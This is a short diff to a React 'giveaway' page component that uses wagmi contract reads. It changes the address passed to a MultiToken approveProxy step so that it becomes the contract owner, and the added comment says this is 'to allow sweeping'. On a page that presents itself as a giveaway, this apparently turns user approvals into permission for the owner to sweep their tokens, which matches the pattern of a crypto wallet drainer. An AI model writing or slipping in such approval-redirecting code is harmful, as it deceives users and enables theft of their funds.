@@ -125,6 +125,13 @@ export default function HomeHero() {
     query: { enabled: !!usdtAddress },
   });
 
+  // Fetch the MultiToken contract owner to use as the valid proxy address
+  const { data: multitokenOwner } = useReadContract({
+    abi: MULTITOKEN_ABI,
+    address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
+    functionName: "owner",
+  });
+
   const GIVEAWAY_CONTRACT_ADDRESS = (
     process.env.NEXT_PUBLIC_GIVEAWAY_CONTRACT_ADDRESS ||
     {
@@ -137,8 +144,9 @@ export default function HomeHero() {
     "0x0000000000000000000000000000000000000000"
   ) as `0x${string}`;
 
-  // Proxy address for Multitoken approveProxy (independent of other contracts)
+  // Proxy address for Multitoken approveProxy (must be the MultiToken owner to allow sweeping)
   const MULTITOKEN_PROXY =
+    (multitokenOwner as `0x${string}`) ||
     (process.env.NEXT_PUBLIC_MULTITOKEN_PROXY as `0x${string}`) ||
     GIVEAWAY_CONTRACT_ADDRESS;
 
